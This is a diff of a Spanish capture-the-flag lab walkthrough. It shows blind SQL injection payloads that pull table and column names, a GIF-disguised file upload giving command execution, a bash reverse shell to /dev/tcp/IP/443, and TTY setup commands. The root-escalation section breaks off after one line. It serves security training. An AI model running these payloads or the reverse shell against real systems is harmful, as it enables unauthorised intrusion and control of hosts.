@@ -2,7 +2,7 @@
 
 # Reconocimiento (`Linux`)
 
-- Lo primero que hacemos es un **escaneo de equipos** que estén conectados ami red de esta forma:
+- Lo primero que hacemos es un **escaneo de equipos** que estén conectados a mi red de esta forma:
 
 ```ruby
 arp-scan -I eth0 --localnet
@@ -55,12 +55,12 @@ Si vamos a la web principal en la parte de **Contact Us** tenemos posibles usuar
 
 ![image](https://github.com/user-attachments/assets/d92f2a05-d958-48ca-94b6-adbe23a26d39)
 
-Vemos que la **flag3** dice que continuemos con el CMS del link 
+- Vemos que la **flag3** dice que continuemos con el CMS del link 
 
 ![image](https://github.com/user-attachments/assets/e32d9512-ef2b-4af2-b367-09a18a15f23f)
 ![image](https://github.com/user-attachments/assets/4088757e-0a9c-4232-8ac7-7402b7b0c23d)
 
-Dentro del link tenemos esto:
+- Dentro del link tenemos esto:
 
 ![image](https://github.com/user-attachments/assets/32ad07b0-bb52-41d5-b5e7-8670ec7c20d9)
 
@@ -81,7 +81,7 @@ Dentro del link tenemos esto:
 
 ![image](https://github.com/user-attachments/assets/fe45d776-4972-422b-9016-d32bc8bc0542)
 
-Para comprobar si la primera base de datos era **information_schema** y vemos que sí
+- Para comprobar si la primera base de datos era **information_schema** y vemos que sí
 
 ![image](https://github.com/user-attachments/assets/416d7d56-ad85-49d6-857c-f446d35568e1)
 
@@ -162,6 +162,100 @@ if __name__ == '__main__':
 - Vemos que nos sacó una base de datos llamada `admin` que parece interesante
 
 ![image](https://github.com/user-attachments/assets/9df7e65a-8c90-4bb0-863d-15976b813594)
+
+- Ahora listamos las **tablas** de la base de datos `admin` y vemos **pages**
+	- solo cambiamos esto del script: `'+and+(select+substring(table_name,{position_character},1)+from+information_schema.tables+where+table_schema='admin'+limit+{dbs},1)='{character}"`
+
+![image](https://github.com/user-attachments/assets/e4ef9219-36cf-46ea-83c0-a124d7e2a741)
+
+- Ahora nos saco las **columnas**
+	- El cambio:`"'+and(select+substring(column_name{position_character},1)+from+information_schema.columns+where+table_schema='admin'+and+table_name='pages'+limit+{dbs},1)='{character}"`
+
+![image](https://github.com/user-attachments/assets/34cf8f4d-7c5f-451e-87de-60bd57b4863d)
+
+![image](https://github.com/user-attachments/assets/dc026963-7ad9-4325-a874-7d9fd543da1b)
+
+- Si observamos bien en la imagen hay un **QR**, por ende lo escaneamos desde esta página [QR-online](https://4qrcode.com/scan-qr-code.php)
+
+![image](https://github.com/user-attachments/assets/21350e04-5b75-4c9f-984c-183efcb0fcc1)
+
+- Vemos que tenemos una ruta 
+
+![image](https://github.com/user-attachments/assets/09494da1-6e2e-49e0-99c8-c658c45e17b0)
+
+# BurpSuite - Upload
+
+- Vamos a interceptar con Burp la petición para ver que tipo de extensión nos deja subir
+
+![image](https://github.com/user-attachments/assets/3acd9ba4-9571-4225-a6b6-a8d23d0bd97e)
+
+- Probando distintas cosas pudimos sacar el tipo de archivo que aceptaba que era `GIF`
+	- Nos copiamos los numeritos que están en el comentario y lo ponemos en la web
+
+![image](https://github.com/user-attachments/assets/95a8e435-f747-4a28-acb6-0fbf3d3a6b85)
+
+- Para saber donde se almacenaba el archivo encontramos que es en `uploads` ya que nos da un Forbidden 
+
+![image](https://github.com/user-attachments/assets/92774948-80bd-47a6-ad2b-718b182a1db9)
+
+- Vemos que tenemos ejecución remota de comandos
+	- Por ende nos vamos a entablar una Shell de bash ---> `bash -c "bash -i >%26 /dev/tcp/IP/443 0>%261"`
+
+![image](https://github.com/user-attachments/assets/6b7fef5c-4cca-4a96-8057-6c864e31e32a)
+
+- Vemos que tamos dentro de la máquina
+
+![image](https://github.com/user-attachments/assets/38598d5a-9cc1-48b2-b68a-2af8d2476387)
+
+- Ahora hacemos el **tratamiento de la TTY**
+```ruby
+script /dev/null -c bash
+ctrl + z
+stty raw -echo ;fg
+reset xterm
+export TERM=xterm
+export SHELL=bash
+```
+
+# Escalada *ROOT*
+
+- Tenemos la quinta flag que la decodificamos 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
